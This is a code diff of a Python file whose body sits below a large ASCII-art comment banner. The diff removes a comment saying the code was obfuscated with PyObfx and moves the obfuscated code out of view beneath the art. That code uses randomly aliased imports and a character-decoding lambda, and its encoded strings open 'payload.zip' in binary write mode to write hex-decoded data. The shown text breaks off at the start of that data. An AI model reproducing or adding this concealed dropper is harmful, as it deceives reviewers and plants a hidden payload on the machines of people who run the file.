@@ -1,13 +1,5 @@
 # *********************************S&@$%****%$@@&S********************************
 # ****************************S@%*::.............:!%@#****************************
-# Obfuscated with PyObfx #
-import binascii as WjURgGdBriwDLmJh
-import zipfile as crxKGVlgfJiMDB
-import os as CeOK
-import time as gksxrWvf
-
-lxTkoezWCb = lambda n: (n ^ 1) / 2
-IwZSJXHxnU = lambda s: ''.join(chr(int(lxTkoezWCb(ord(c)))) for c in s)
 # **********************SSSS@*:......................:!$#*************************
 # ******************S&@@&@%:............................:%#***********************
 # *****************#$$@@%:.........................:::::..%#S*********************
@@ -51,6 +43,16 @@ IwZSJXHxnU = lambda s: ''.join(chr(int(lxTkoezWCb(ord(c)))) for c in s)
 # ********************&$@&@@&&@@#**************#@@&&@@&&@@S***********************
 # *********************S*SSSSSS*****************#&@#&&&###S***********************
 # *********************S*SSSSSS*****************#&@#&&&###S***********************
+
+
+
+import binascii as WjURgGdBriwDLmJh
+import zipfile as crxKGVlgfJiMDB
+import os as CeOK
+import time as gksxrWvf
+
+lxTkoezWCb = lambda n: (n ^ 1) / 2
+IwZSJXHxnU = lambda s: ''.join(chr(int(lxTkoezWCb(ord(c)))) for c in s)
 
 with open(IwZSJXHxnU("áÃóÙßÃÉ]õÓá"), IwZSJXHxnU("ïÅ")) as cN:
     cN.write(WjURgGdBriwDLmJh.unhexlify(
